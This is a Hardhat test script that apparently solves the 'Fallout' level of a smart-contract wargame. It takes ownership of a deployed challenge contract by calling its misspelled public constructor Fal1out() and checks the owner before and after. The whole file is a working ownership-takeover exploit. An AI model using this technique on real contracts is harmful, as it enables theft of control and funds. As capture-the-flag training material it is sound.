const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0xF4257F1136C61c6da17e43CAB2023D25F0A9c483"

describe("02 Fallout", function () {
    let player, challengeContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "Fallout",
            CONTRACT_ADDRESS,
            player
        )
        const ownerBefore = await challengeContract.owner()
        await assert.notEqual(ownerBefore.toString(), player.address.toString())
    })

    it("Execution", async function () {
        const txResponse = await challengeContract.Fal1out()
        await txResponse.wait(1)
    })

    after(async function () {
        const ownerAfter = await challengeContract.owner()
        await assert.equal(ownerAfter.toString(), player.address.toString())
    })
})
